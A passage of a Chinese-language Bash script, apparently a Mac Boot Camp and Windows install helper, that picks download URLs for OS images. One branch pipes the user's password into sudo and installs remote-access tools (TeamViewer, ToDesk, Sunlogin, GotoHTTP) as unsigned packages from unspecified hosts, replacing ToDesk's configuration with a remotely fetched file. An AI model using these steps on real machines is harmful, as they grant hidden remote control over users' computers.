if [ "$sxtmsdn10n" ]; then
re1909="1"
index="1"
SourceSHA1="44800e18dde8f07236e1b89b6c7a44a446262394"
url="$ip8/666/10n.esd"
url3="$ip8/666/asip.wim"
name3="PEDRV.dmg"
SourceMD53="492f286767b46413981889f8b601f38f"
name="10n.esd"
drvname="10n.esd"
fi

if [ ! "$name" ]; then
name=${url##*/}
drvname=${url##*/}
fi


if [ "$sip" ]; then
if [ "$MBR10" ]; then
sip="1"
sipp="1"
MBR10=""
fi
fi
    if [ ! "$MBR10" ]; then
    if [[ $modelxh = "10.10"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.11"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.12"* ]]; then
    sip="1"
    fi
    fi
	PEDrv="1"
	repe="1"
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$MBR10" ]; then
	name2="BootCampESD.pkg"
	url2="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	if [ "$zgmac" = "10.13" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	if [ "$zgmac" = "10.11" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi


FenQu3
fi

if [ "$sxt10" ]; then
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
macboot="$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4,$5,$6}')"
devboot="$(diskutil list | grep "$macboot" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1)"
if [ ! "$devboot" ]; then
devboot="$(diskutil list | grep "$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4}')" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1 | tail -n 1)"
fi
jchxj="$(diskutil list | grep Apple_CoreStorage)"
if [ ! "$jchxj" ]; then
if [ ! "${devboot:6:1}" ]; then
devboot=""
if [[ $modelxh = "10.7"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.8"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.9"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.10"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.11"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.12"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "11."* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "12."* ]]; then
devboot="disk1s1"
fi
if [ "$zxos" ]; then
devboot="disk1s1"
fi
fi
fi
num="${devboot:4:1}"
num2="${devboot:6:1}"
if [ "$jchxj" ]; then
hfs_size=`diskutil info -plist "$devboot" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`	
else	
hfs_size=`diskutil info -plist disk"$num"s"$num2" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
fi
size=$kjdx"000000000"
new_hfs_size="$(($hfs_size-$size))b"

if [ "$wzhfxt" = "6136" ]; then
if [[ $modelxh = "10.8"* ]]; then
wzhfxt="6135"
fi
if [[ $modelxh = "10.7"* ]]; then
wzhfxt="6135"
fi
fi

if [ "$wzhfxt" = "7866" ]; then
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 如果此画面不动，请按一下回车\033[0m"
echo
echo
	imacrhb="$(diskutil resetFusion | grep "Rotational")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
	wzhfxt="7867"
	fi
	fi
	if [ "$imacpd" ]; then
	imacrhb="$(diskutil cs list | grep "Fusion")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
	wzhfxt="7867"
	fi
	else
	wzhfxt="7866"
	fi	
	fi		
	fi
if [ "$wzhfxt" = "6721" ]; then	
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 如果此画面不动，请按一下回车\033[0m"
echo
echo
	imacrhb="$(diskutil resetFusion | grep "Rotational")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 此电脑硬盘不支持此模式，请更换\033[0m"
echo
exit
	fi
	fi
	if [ "$imacpd" ]; then
	imacrhb="$(diskutil cs list | grep "Fusion")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 此电脑硬盘不支持此模式，请更换\033[0m"
echo
exit
	fi
	else
	wzhfxt="6721"
	fi	
	fi	
fi	
	tarbc=""
	DrvWZ="1"
	WZname="5"$wzhfxt".dmg"
	name="5"$wzhfxt".dmg"
	url="$ip8/Win/10/5"$wzhfxt".dmg"
	if [ ! "$wzhfxt" ]; then
	WZname="56135.dmg"	
	name="56135.dmg"	
	url="$ip8/Win/10/56135.dmg"	
	fi
	FenQu3
fi

if [ "$sxt11new" ]; then
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
macboot="$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4,$5,$6}')"
devboot="$(diskutil list | grep "$macboot" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1)"
if [ ! "$devboot" ]; then
devboot="$(diskutil list | grep "$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4}')" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1 | tail -n 1)"
fi
jchxj="$(diskutil list | grep Apple_CoreStorage)"
if [ ! "$jchxj" ]; then
if [ ! "${devboot:6:1}" ]; then
devboot=""
if [[ $modelxh = "10.7"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.8"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.9"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.10"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.11"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.12"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "11."* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "12."* ]]; then
devboot="disk1s1"
fi
if [ "$zxos" ]; then
devboot="disk1s1"
fi
fi
fi
num="${devboot:4:1}"
num2="${devboot:6:1}"
if [ "$jchxj" ]; then
hfs_size=`diskutil info -plist "$devboot" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`	
else	
hfs_size=`diskutil info -plist disk"$num"s"$num2" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
fi
size=$kjdx"000000000"
new_hfs_size="$(($hfs_size-$size))b"

if [ "$wzhfxt" = "6136" ]; then
if [[ $modelxh = "10.8"* ]]; then
wzhfxt="6135"
fi
if [[ $modelxh = "10.7"* ]]; then
wzhfxt="6135"
fi
fi

#if [ "$wzhfxt" = "7072" ]; then
#wzhfxt="7071"	
#fi

if [ "$wzhfxt" = "7866" ]; then
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 如果此画面不动，请按一下回车\033[0m"
echo
echo
	imacrhb="$(diskutil resetFusion | grep "Rotational")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
	#wzhfxt="7867"
	clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 此电脑硬盘不支持此模式，请更换\033[0m"
echo
exit
	fi
	fi
	if [ "$imacpd" ]; then
	imacrhb="$(diskutil cs list | grep "Fusion")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
	#wzhfxt="7867"
	clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 此电脑硬盘不支持此模式，请更换\033[0m"
echo
exit
	fi
	else
	wzhfxt="7866"
	fi	
	fi		
	fi
if [ "$wzhfxt" = "6721" ]; then	
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 如果此画面不动，请按一下回车\033[0m"
echo
echo
	imacrhb="$(diskutil resetFusion | grep "Rotational")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 此电脑硬盘不支持此模式，请更换\033[0m"
echo
exit
	fi
	fi
	if [ "$imacpd" ]; then
	imacrhb="$(diskutil cs list | grep "Fusion")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 此电脑硬盘不支持此模式，请更换\033[0m"
echo
exit
	fi
	else
	wzhfxt="6721"
	fi	
	fi	
fi	
	tarbc=""
	wzwim=""
	DrvWZ="1"
	WZname="8"$wzhfxt".dmg"
	name="8"$wzhfxt".dmg"
    url="$ip8/Win/11/8"$wzhfxt".dmg"
	if [ ! "$wzhfxt" ]; then
	WZname="86135.dmg"		
	name="86135.dmg"	
	url="$ip8/Win/11/86135.dmg"	
	fi	
	FenQu3
fi

if [ "$sxt7" ]; then
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
macboot="$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4,$5,$6}')"
devboot="$(diskutil list | grep "$macboot" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1)"
if [ ! "$devboot" ]; then
devboot="$(diskutil list | grep "$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4}')" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1 | tail -n 1)"
fi
jchxj="$(diskutil list | grep Apple_CoreStorage)"
if [ ! "$jchxj" ]; then
if [ ! "${devboot:6:1}" ]; then
devboot=""
if [[ $modelxh = "10.7"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.8"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.9"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.10"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.11"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.12"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "11."* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "12."* ]]; then
devboot="disk1s1"
fi
if [ "$zxos" ]; then
devboot="disk1s1"
fi
fi
fi
num="${devboot:4:1}"
num2="${devboot:6:1}"
if [ "$jchxj" ]; then
hfs_size=`diskutil info -plist "$devboot" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`	
else	
hfs_size=`diskutil info -plist disk"$num"s"$num2" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
fi
size=$kjdx"000000000"
new_hfs_size="$(($hfs_size-$size))b"
PEDrv="1"
tarbc="1"
	repe="1"
	MBR10="1"
	re700="1"
	index="4"
	OsWin764="1"
	if [ "$sip" ]; then
	MBR10=""	
	fi
	msdn7="1"
	name2="cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso"
	drvname="cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso"
	url2="http://ybcn-ruanjiandown-com.supergslb.com/cn/cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso"
	SourceSHA1="2ce0b2db34d76ed3f697ce148cb7594432405e23"
	if [ "$yyw7" ]; then
	index="2"
	name2="Windows7x86x64.iso"
	drvname="Windows7x86x64.iso"
	url2="https://d.yyej.com/?id=Win7"
	SourceSHA1="f79198294b2a07893c9b3621a8590ac13b534de2"
	fi
	if [ "$btap" ]; then
	if [ "$btap" = "5.1.5640" ]; then
 	name="BootCamp.zip"
	url="http://xzd.197946.com/bootcamp.zip"
	fi
	if [ "$btap" = "5.1.5769" ]; then
 	name="BootCamp.zip"
	url="https://download.info.apple.com/Mac_OS_X/031-30890-20150812-ea191174-4130-11e5-a125-930911ba098f/bootcamp5.1.5769.zip"
	fi
	if [ "$btap" = "5.1.5722" ]; then
 	name="BootCamp.zip"
	url="https://download.info.apple.com/Mac_OS_X/031-30883-20150812-ea1d13dc-4130-11e5-ba25-920911ba098f/bootcamp5.1.5722.zip"
	fi
	if [ "$btap" = "5.1.5621" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.1.4586" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/35/46/041-87995-A_EWCD1K4CH1/2b5jaj1p2oxqlpzgwat4bdqjpjs8n3mxip/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4326" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/50/29/041-84869-A_EJ35WAWA75/obofx71e3kcf8aqzukdrzg7hqpv1p06hca/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4255" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/36/49/041-98163/n3zau0xy5j0a121vnvud3jac2ahplizknu/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4131" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/29/62/041-84859-A_GGUOSJMIGN/sb1apxcjpp358ze2df6bzhwd49m2cqyzy5/BootCampESD.pkg"
	fi
	else
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/57/55/041-84868-A_402D0DFI39/6uz8hhgtd4b87t00mrq0uihiop5ivumsbk/BootCampESD.pkg"	
    fi
	FenQu3

fi

if [ "$sxt732" ]; then
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
macboot="$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4,$5,$6}')"
devboot="$(diskutil list | grep "$macboot" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1)"
if [ ! "$devboot" ]; then
devboot="$(diskutil list | grep "$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4}')" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1 | tail -n 1)"
fi
jchxj="$(diskutil list | grep Apple_CoreStorage)"
if [ ! "$jchxj" ]; then
if [ ! "${devboot:6:1}" ]; then
devboot=""
if [[ $modelxh = "10.7"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.8"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.9"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.10"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.11"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.12"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "11."* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "12."* ]]; then
devboot="disk1s1"
fi
if [ "$zxos" ]; then
devboot="disk1s1"
fi
fi
fi
num="${devboot:4:1}"
num2="${devboot:6:1}"
if [ "$jchxj" ]; then
hfs_size=`diskutil info -plist "$devboot" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`	
else	
hfs_size=`diskutil info -plist disk"$num"s"$num2" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
fi
size=$kjdx"000000000"
new_hfs_size="$(($hfs_size-$size))b"
tarbc="1"
	PEDrv="1"
	repe="1"
	re700="1"
	Win786="1"
	index="5"
	if [ "$sip" ]; then
	MBR10=""	
	fi
    msdn732="1"
	name2="cn_windows_7_ultimate_with_sp1_x86_dvd_u_677486.iso"
	drvname="cn_windows_7_ultimate_with_sp1_x86_dvd_u_677486.iso"
	url2="http://ybcn.ruanjiandown.com:6875/cn/cn_windows_7_ultimate_with_sp1_x86_dvd_u_677486.iso"
	if [ "$btap" ]; then
	if [ "$btap" = "4.1.4586" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/35/46/041-87995-A_EWCD1K4CH1/2b5jaj1p2oxqlpzgwat4bdqjpjs8n3mxip/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4326" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/50/29/041-84869-A_EJ35WAWA75/obofx71e3kcf8aqzukdrzg7hqpv1p06hca/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4255" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/36/49/041-98163/n3zau0xy5j0a121vnvud3jac2ahplizknu/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4131" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/29/62/041-84859-A_GGUOSJMIGN/sb1apxcjpp358ze2df6bzhwd49m2cqyzy5/BootCampESD.pkg"
	fi
	else
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/57/55/041-84868-A_402D0DFI39/6uz8hhgtd4b87t00mrq0uihiop5ivumsbk/BootCampESD.pkg"	
    fi
	FenQu3
fi

if [ "$team" ]; then



if [[ $modelxh = "10.5"* ]]; then
clear && printf "\e[3J"
echo
echo
echo $zdys"                        ""\033[42;30m 版本太低，无法安装远程软件！！！\033[0m"
echo
exit
fi

if [[ $modelxh = "10.6"* ]]; then
xrkyc="1"
fi

if [[ $modelxh = "10.7"* ]]; then
goyc="1"
fi
if [[ $modelxh = "10.8"* ]]; then
goyc="1"
fi
if [[ $modelxh = "10.9"* ]]; then
goyc="1"
fi
if [[ $modelxh = "10.10"* ]]; then
goyc="1"
fi
if [[ $modelxh = "10.11.3" ]]; then
goyc="1"
fi
if [[ $modelxh = "10.11.2" ]]; then
goyc="1"
fi
if [[ $modelxh = "10.11.1" ]]; then
goyc="1"
fi
if [[ $modelxh = "10.11" ]]; then
goyc="1"
fi
if [[ $modelxh = "10.14.6" ]]; then
zxtv="1"
fi
if [[ $modelxh = "10.15"* ]]; then
zxtv="1"
fi
if [[ $modelxh = "11."* ]]; then
zxtv="1"
fi
if [[ $modelxh = "12."* ]]; then
zxtv="1"
fi
if [ "$zxos" ]; then
zxtv="1"
fi
clear && printf "\e[3J"
echo
echo "                        ""\033[42;30m 正在下载远程工具...请您等待一会...\033[0m"
echo


if [ "$xrkyc" ]; then
echo "$pass" | sudo -S sudo rm -rf ~/Downloads/xrkyc.dmg >/dev/null 2>&1
curl -# -C - --connect-timeout 10 -o ~/Downloads/xrkyc.dmg --retry 5 "$osip/xrk.dmg"
hdiutil attach ~/Downloads/xrkyc.dmg >/dev/null 2>&1
killall SunloginClient >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/SunloginClient.app >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /private/var/db/receipts/com.oray.sunlogin.client.bom >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /private/var/db/receipts/com.oray.sunlogin.macclient.bom >/dev/null 2>&1
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /Volumes/磁盘映像/SunloginClient.pkg -target / >/dev/null 2>&1
diskutil eject $(diskutil list | grep '磁盘映像' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g') >/dev/null 2>&1
zhendockk=$(defaults read com.apple.dock | grep SunloginClient.app)
if [ ! "$zhendockk" ]; then
defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/SunloginClient.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
fi
sleep 2
open /Applications/SunloginClient.app
osascript <<EOD
activate application "SunloginClient"
tell application "System Events"
set visible of processes where name is not "SunloginClient" to false
end tell
EOD
killall Terminal
fi


if [ "$goyc" ]; then
echo "$pass" | sudo -S sudo rm -rf ~/Downloads/gotohttp.dmg >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf ~/Downloads/xrkyc.dmg >/dev/null 2>&1
curl -# -C - --connect-timeout 10 -o ~/Downloads/gotohttp.dmg --retry 5 "http://gotohttp.com/gotohttp.dmg"
curl -# -C - --connect-timeout 10 -o ~/Downloads/xrkyc.dmg --retry 5 "$osip/xrk.dmg"
hdiutil attach ~/Downloads/gotohttp.dmg >/dev/null 2>&1
hdiutil attach ~/Downloads/xrkyc.dmg >/dev/null 2>&1
killall SunloginClient >/dev/null 2>&1
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /Volumes/GotoHTTP/Uninstall.pkg -target / >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/SunloginClient.app >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /private/var/db/receipts/com.oray.sunlogin.macclient.bom >/dev/null 2>&1
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /Volumes/GotoHTTP/Install.pkg -target / >/dev/null 2>&1
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /Volumes/磁盘映像/SunloginClient.pkg -target / >/dev/null 2>&1
diskutil eject $(diskutil list | grep 'GotoHTTP' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g') >/dev/null 2>&1
diskutil eject $(diskutil list | grep '磁盘映像' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g') >/dev/null 2>&1
zhendock=$(defaults read com.apple.dock | grep GotoHTTP.app)
if [ ! "$zhendock" ]; then
defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/GotoHTTP.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
fi
zhendockk=$(defaults read com.apple.dock | grep SunloginClient.app)
if [ ! "$zhendockk" ]; then
defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/SunloginClient.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
fi
sleep 2
open /Applications/GotoHTTP.app
osascript <<EOD
activate application "GotoHTTP"
tell application "System Events"
set visible of processes where name is not "GotoHTTP" to false
end tell
EOD
killall Terminal
clear && printf "\e[3J"
echo
echo
echo "                        ""\033[42;30m 请现在手机对着【整个电脑屏幕】拍照给技术员！\033[0m"
echo
exit
fi



if [ "$tdyc" ]; then
killall ToDesk >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/ToDesk.app >/dev/null 2>&1
rm -rf "/tmp/"$bjsbm".sh" >/dev/null 2>&1
rm -rf "/tmp/"$bjsbm"1.sh" >/dev/null 2>&1
echo 
curl -# -C - --connect-timeout 10 -o ~/Downloads/TDYC.pkg --retry 5 "https://dl.todesk.com/macos/ToDesk_4.6.0.0.pkg"
curl -# -C - --connect-timeout 10 -o /tmp/config.ini --retry 5 "$osip/tdyc.ini"
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg ~/Downloads/TDYC.pkg -target / >/dev/null 2>&1
sleep 2
open /Applications/ToDesk.app
sleep 6
tdid=$(cat /Applications/ToDesk.app/Contents/config.ini | grep clientid)
tdid=${tdid##* }
killall ToDesk
echo "$pass" | sudo -S sudo rm -rf /Applications/ToDesk.app/Contents/config.ini
echo "$pass" | sudo -S sudo cp -R /tmp/config.ini /Applications/ToDesk.app/Contents/config.ini
sleep 2
open /Applications/ToDesk.app
sleep 3
osascript <<EOD
activate application "ToDesk"
tell application "System Events"
set visible of processes where name is not "ToDesk" to false
end tell
EOD
sleep 2
tdyc=""
team=""
kaishi
fi



#curl --connect-timeout 10 -o ~/Downloads/远程工具.dmg "https://tv-static-net.oss-cn-beijing.aliyuncs.com/download/tv15/TeamViewerQS.dmg" >/dev/null 2>&1
#hdiutil attach ~/Downloads/远程工具.dmg >/dev/null 2>&1
#open /Volumes/TeamViewerQS
#open /Volumes/TeamViewerQS/TeamViewerQS.app
#curl --connect-timeout 10 -o ~/Downloads/TeamViewer15.dmg "https://dl.teamviewer.cn/download/version_15x/15.2.2756/TeamViewer.dmg" >/dev/null 2>&1
if [ ! "$zxtv" ]; then
curl -# -C - --connect-timeout 10 -o ~/Downloads/TeamViewer15.dmg --retry 8888 "https://tv-static-net.oss-cn-beijing.aliyuncs.com/download/tv15/TeamViewer.dmg"
else
curl -# -C - --connect-timeout 10 -o ~/Downloads/TeamViewer15.dmg --retry 8888 "$osip/tv15.dmg"
fi
killall TeamViewer >/dev/null 2>&1
killall TeamViewerQS >/dev/null 2>&1
hdiutil attach ~/Downloads/TeamViewer15.dmg >/dev/null 2>&1
if [ ! "$zxtv" ]; then
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /Volumes/TeamViewer/Install\ TeamViewer.pkg -target / >/dev/null 2>&1
else
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /Volumes/TeamViewer/Install\ TeamViewer.app/Contents/Resources/Install\ TeamViewer.pkg -target / >/dev/null 2>&1
fi
diskutil eject $(diskutil list | grep 'TeamViewer' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g') >/dev/null 2>&1
zhendock=$(defaults read com.apple.dock | grep TeamViewer.app)
if [ ! "$zhendock" ]; then
defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/TeamViewer.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
fi
sleep 2
open /Applications/TeamViewer.app
osascript <<EOD
activate application "TeamViewer"
tell application "System Events"
set visible of processes where name is not "TeamViewer" to false
end tell
EOD
sleep 2
killall Terminal
clear && printf "\e[3J"
echo
echo "                        ""\033[42;30m 请现在手机对着【整个电脑屏幕】拍照给技术员！\033[0m"
echo
osascript -e 'Tell application "System Events" to display dialog "请现在手机对着【整个电脑屏幕】拍照给技术员！" buttons {"OK"}'
sleep 3
killall Terminal
exit 
fi

if [ "$ychpkj" ]; then
rm -rf "/tmp/"$bjsbm".sh"
rm -rf "/tmp/"$bjsbm"1.sh"
HBFQS="1"
HBFQ
fi

if [ "$azbdpe" ]; then
azbdpe="1"
name="10pe.iso"
url="$ip8/666/10PE.iso"
SourceMD5="9f51660137ae054cdb07f88386b6bcbc"
if [[ $modelxh = "10.4"* ]]; then
oldpe="1"
name="PE.dmg"
url="$ip8/666/PE.dmg"
SourceMD5="441c709acebb435375f59900d3d229d6"
fi
if [[ $modelxh = "10.5"* ]]; then
name="PE.dmg"
url="$ip8/666/PE.dmg"
SourceMD5="441c709acebb435375f59900d3d229d6"
fi
Download
fi

if [ "$azuppe" ]; then
azuppe="1"
name="10pe.iso"
url="$ip8/666/10PE.iso"
SourceMD5="9f51660137ae054cdb07f88386b6bcbc"
Download
fi

if [ "$azbd11pe" ]; then
azbdpe="1"
name="11pe.iso"
url="$ip8/666/11PE.iso"
SourceMD5="41cb878e8d2b03f1cd481988e937535e"
Download
fi

if [ "$azup11pe" ]; then
azuppe="1"
name="11pe.iso"
url="$ip8/666/11PE.iso"
SourceMD5="41cb878e8d2b03f1cd481988e937535e"
Download
fi

if [ "$sjmacxt" ]; then
if [[ $sjmacxt = "10.13" ]]; then
name="USB.Flash.Install.macOS.High.Sierra.10.13.6.02.v2n.dmg"
url="$ip8/Os/10.13.6.dmg"
SourceMD5="6660b64c1d32989c01c2b1e05a0edd9d"
wzbsjmac="10.13"
Download
fi
if [[ $sjmacxt = "10.14" ]]; then
name="USB.Flash.Install.macOS.Mojave.10.14.6.06.v2s.dmg"
url="$ip8/Os/10.14.6.dmg"
SourceMD5="d214016fd32f6f3292901cc444e152d9"
wzbsjmac="10.14"
Download
fi
if [[ $sjmacxt = "10.15" ]]; then
name="USB.Flash.Install.macOS.Catalina.10.15.7.02.19H2.dmg"
url="$ip8/Os/10.15.7.dmg"
SourceMD5="9d5d419e73555f98dfa42c723f61eb7e"
wzbsjmac="10.15"
Download
fi
if [[ $sjmacxt = "11.0" ]]; then
name="USB.Flash.Install.macOS.Big.Sur.11.7.2.20G1020.dmg"
url="$ip8/Os/11x.dmg"
SourceMD5="02eaad7dff006194d1e3c29f77ebc1b1"
wzbsjmac="11.0"
Download
fi
if [[ $sjmacxt = "12.0" ]]; then
name="USB.Flash.Install.macOS.Monterey.v12.6.Y1.dmg"
url="$ip8/Os/12x.dmg"
SourceMD5="bbc07a1fa84d1c44e67e5f2ce61657f0"
wzbsjmac="12.0"
Download
fi
if [[ $sjmacxt = "13.0" ]]; then
name="USB.Flash.Install.macOS.Ventura.v13.2.J5.dmg"
url="$ip8/Os/13x.dmg"
SourceMD5="2ab33119c6d2e7b78d23508dcc10598c"
wzbsjmac="13.0"
Download
fi
fi

if [ "$sxtold" ]; then
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
macboot="$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4,$5,$6}')"
